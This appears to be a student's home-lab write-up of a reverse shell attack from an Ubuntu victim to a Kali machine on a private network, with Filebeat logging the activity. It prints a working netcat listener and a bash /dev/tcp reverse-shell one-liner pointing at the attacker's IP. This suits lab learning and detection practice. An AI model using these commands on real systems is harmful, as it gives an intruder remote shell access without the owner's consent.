# Reverse Shell attack Documenation

#Goal
Creating a simulate initial foothold by creating a reverse shell from the 
victim machine to the attackers Kali Linux machine 

# Environment

- Attacker: Kali Linux
- Victim: Ubunto Server
- Attackers IP: 192.168.1.4
- Victim IP: 192.168.1.32
- Port: 4444

# Step by step Execution

### 1. Listener Setup(attacker setup)

First, i opened a Netcat listener on the attacker setup wating from a incoming connection
from the Victim set up.
-----------------------
nc -Lvnp 4444
-----------------------

### 2. Triggering the reverse shell(Victim Setup)

On the victim machine, i have crafted a one-liner to start the reverse shell.
when ran correctly the shell session should open in the attackers side.

-----------------------
bash -i >& /dev/tcp/192.168.1.4/4444 0>&1
-----------------------

### 3. Shell Verification

Had to confirmed i had access by running the following command:
-----------------------
whoami
id
hostname
-----------------------

## 4. Shell Stabilization

The raw reverse shell got unstable, inputs were starting to lag and started to show 
all inputs in caps. Fixed it by running this command:
------------------------
export TERM=xterm
------------------------
Then procedded to close the terminal and started to re-did everything untill i got back
up to the reverse prompt


# Outcome
 - Shell was establised and stabilized
 - The Vicim system responded well after fixing the instable reverse shell
 - Filebeat(on Victim setup) was logging everything


# Notes
- This attack assumes the attacker has a way to execute a command on the victum
- The reverse command can be blocked off by firewalls if the ports were filiterd.
